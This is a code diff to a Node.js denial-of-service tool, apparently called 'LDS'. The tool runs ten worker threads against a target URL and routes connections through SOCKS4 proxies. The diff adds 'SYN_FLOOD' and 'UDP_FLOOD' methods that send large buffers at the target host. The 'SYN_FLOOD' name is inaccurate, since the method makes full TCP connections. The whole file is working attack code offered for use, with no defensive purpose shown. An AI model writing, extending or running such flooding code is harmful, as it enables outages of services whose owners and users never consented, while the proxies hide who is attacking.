@@ -1,5 +1,7 @@
 const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
 const { SocksClient } = require('socks');
+const dgram = require('dgram');
+const net = require('net');
 const layer7 = require('./methods/layer7');
 const fs = require('fs');
 
@@ -18,14 +20,14 @@ if (!isMainThread) {
                 proxy: {
                     ipaddress: proxyIp,
                     port: parseInt(proxyPort),
-                    type: 4, // SOCKS4
+                    type: 4, 
                 },
                 destination: {
                     host: target.hostname,
                     port: target.port || (target.protocol === 'https:' ? 443 : 80),
                 },
                 command: 'connect',
-                timeout: 5000,
+                timeout: 10000, 
             };
 
             SocksClient.createConnection(options, (err, info) => {
@@ -41,8 +43,24 @@ if (!isMainThread) {
                 }
             });
         } else {
-            if (layer7[method]) {
-                layer7[method](null, target, kbSize);
+            if (method === 'SYN_FLOOD') {
+                const client = new net.Socket();
+                client.connect(target.port || 80, target.hostname, () => {
+                    client.write(Buffer.alloc(kbSize * 1024)); 
+                });
+
+                client.on('error', (err) => {
+                    console.error(`LDS: SYN Flood Error: ${err.message}`);
+                });
+            } else if (method === 'UDP_FLOOD') {
+                const client = dgram.createSocket('udp4');
+                const payload = Buffer.alloc(kbSize * 1024);
+
+                client.send(payload, 0, payload.length, target.port || 80, target.hostname, (err) => {
+                    if (err) {
+                        console.error(`LDS: UDP Flood Error: ${err.message}`);
+                    }
+                });
             } else {
                 console.error(`LDS: Method ${method} not found.`);
             }
@@ -51,7 +69,7 @@ if (!isMainThread) {
 }
 
 function start(targetUrl, delay, kbSize, method) {
-    const numWorkers = 10; 
+    const numWorkers = 10;
     for (let i = 0; i < numWorkers; i++) {
         const worker = new Worker(__filename, {
             workerData: { targetUrl, delay, kbSize, method },
